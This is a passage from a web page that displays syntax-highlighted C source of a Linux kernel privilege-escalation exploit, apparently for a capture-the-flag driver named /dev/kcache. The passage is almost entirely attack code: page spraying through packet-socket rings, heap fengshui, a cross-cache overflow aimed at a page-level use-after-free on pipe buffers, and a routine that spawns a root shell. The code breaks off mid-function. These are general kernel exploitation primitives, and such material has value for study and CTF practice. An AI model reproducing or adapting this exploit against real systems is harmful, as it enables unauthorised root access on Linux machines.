class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief create an isolate namespace</span><br><span class="hljs-comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span><br><span class="hljs-comment"> * to perform basic exploiting operations in it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_NUM 0x10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_ALLOC 0x114</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_APPEND 0x514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_READ 0x1919</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_FREE 0x810</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_append</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_read</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_free</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * III -  pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-comment">/* operations type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-comment">/* tpacket version for setsockopt */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-comment">/* pipe for cmd communication */</span><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">/* create a socket and alloc pages, return the socket fd */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of allocation to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of freeing to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the child, handler for commands from the pipe */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(req.size, req.nr);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-comment">/* init pgv-exploit subsystem :) */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * IV - config for page-level heap spray and heap fengshui</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-type">int</span> pgv_1page_start_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;<br><span class="hljs-type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;<br><br><span class="hljs-comment">/* spray pages in different size for various usages */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * We want a more clear and continuous memory there, which require us to </span><br><span class="hljs-comment">     * make the noise less in allocating order-3 pages.</span><br><span class="hljs-comment">     * So we pre-allocate the pages for those noisy objects there.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-0 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(i, <span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-2 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray 8 pages for page-level heap fengshui */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-3 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">19</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_4pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">21</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">512</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">extend_pipe_buffer_to_4k</span><span class="hljs-params">(<span class="hljs-type">int</span> start_idx, <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr; i++) &#123;<br>        <span class="hljs-comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_8pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;<br><br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span 